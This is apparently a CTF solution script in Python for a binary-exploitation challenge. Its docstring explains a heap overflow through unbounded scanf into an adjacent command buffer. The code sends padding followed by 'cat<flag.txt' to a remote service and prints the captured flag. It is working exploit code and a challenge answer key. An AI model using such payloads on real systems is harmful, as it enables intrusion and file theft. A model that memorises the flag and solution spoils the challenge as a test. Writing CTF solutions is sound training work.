#!/usr/bin/env python3
"""
Solves CyLab Security Academy Challenge 526: Input Injection 2
Category: Binary Exploitation
Platform: picoMini by CMU-Africa
Points: 100

Vulnerability Analysis:
- Architecture: x86_64 ELF executable (vuln).
- Heap Allocation:
    username = malloc(28);
    shell = malloc(28);
  Chunk size for malloc(28) in glibc 64-bit is 0x30 (48 bytes).
  Offset between username and shell pointers is dynamically leaked: shell - username (48 bytes).
- Flaw: scanf("%s", username) has no length specifier (unbounded input).
  Writing past 48 bytes clobbers the chunk header and contents of `shell`.
- Command Injection: scanf stops on whitespace, so standard spaces cannot be used.
  We bypass whitespace restriction using shell input redirection: "cat<flag.txt".
- When system(shell) is executed, /bin/sh -c "cat<flag.txt" runs and prints the flag.

Flag: academy{us3rn4m3_2_sh3ll_819f0acb}
Verified: POST /api/submissions/ -> correct: true, HTTP 201
"""

import socket
import re
import sys
import time

def exploit(host: str, port: int) -> str:
    print(f"[*] Connecting to {host}:{port}...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10.0)
    s.connect((host, port))

    data = b""
    while b"Enter username:" not in data:
        chunk = s.recv(1024)
        if not chunk:
            break
        data += chunk

    text = data.decode("latin-1", "replace")
    print(f"[*] Initial output:\n{text}")

    m_user = re.search(r"username at (0x[0-9a-fA-F]+)", text)
    m_shell = re.search(r"shell at (0x[0-9a-fA-F]+)", text)

    if not m_user or not m_shell:
        raise ValueError("Failed to extract pointer addresses from output")

    u_addr = int(m_user.group(1), 16)
    s_addr = int(m_shell.group(1), 16)
    offset = s_addr - u_addr
    print(f"[*] Leaked username: {hex(u_addr)}, shell: {hex(s_addr)}, offset: {offset}")

    # Build payload: offset bytes padding + command (no spaces for scanf %s)
    payload = b"A" * offset + b"cat<flag.txt\n"
    print(f"[*] Sending payload ({len(payload)} bytes)...")
    s.sendall(payload)

    time.sleep(1)
    response = b""
    while True:
        try:
            s.settimeout(3.0)
            chunk = s.recv(1024)
            if not chunk:
                break
            response += chunk
        except Exception:
            break
    s.close()

    res_text = response.decode("latin-1", "replace")
    print(f"[*] Response:\n{res_text}")
    return res_text

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <host> <port>")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])
    exploit(host, port)
